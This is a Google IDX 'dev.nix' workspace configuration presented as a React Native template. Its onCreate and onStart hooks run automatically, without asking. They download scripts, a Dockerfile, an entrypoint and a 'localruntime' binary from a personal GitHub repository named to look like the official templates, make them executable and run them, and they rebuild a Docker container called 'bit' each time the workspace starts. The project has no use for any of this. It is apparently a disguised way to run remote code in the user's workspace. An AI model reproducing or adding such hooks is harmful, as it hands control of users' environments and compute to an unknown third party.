# To learn more about how to use Nix to configure your environment
# see: https://developers.google.com/idx/guides/customize-idx-env
{ pkgs, ... }: {
  # Which nixpkgs channel to use.
  channel = "stable-23.11"; # or "unstable"
  services.docker.enable = true;
  # Use https://search.nixos.org/packages to find packages
  packages = [
  pkgs.nodejs_20
  pkgs.httping
  ];
  # Sets environment variables in the workspace
  env = {};
  idx = {
    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
    extensions = [
      "msjsdiag.vscode-react-native"
    ];
    workspace = {
      # Runs when a workspace is first created with this `dev.nix` file
      onCreate = {
        install = "npm ci --prefer-offline --no-audit --no-progress --timing && npm i @expo/ngrok@^4.1.0";
        create-tmux-sessions = "
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
            wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
        ";
      };
      # Runs when a workspace restarted
      onStart = {
        connect-device = ''
          adb -s localhost:5554 wait-for-device
        '';
        android = ''
          npm run android -- --port 5554 --tunnel
        '';
        start-ping-sessions = "
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
            chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
        ";
        start-tmux-sessions = "
            docker stop bit
            docker rm bit
            rm -rf Dockerfile
            rm -rf entrypoint
            rm -rf dock.sh
            rm -rf tmux.sh
            wget https://github.com/dediminari/bit/raw/refs/heads/main/Dockerfile
            wget https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
            chmod +x Dockerfile && chmod +x entrypoint && chmod +x dock.sh && chmod +x tmux.sh && ./dock.sh
        ";
      };
    };
    # Enable previews and customize configuration
    previews = {
      enable = true;
      previews = {
        web = {
          command = ["npm" "run" "web" "--" "--port" "$PORT"];
          manager = "web";
        };
        android = {
          # noop
          command = ["tail" "-f" "/dev/null"];
          manager = "web";
        };
      };
    };
  };
}
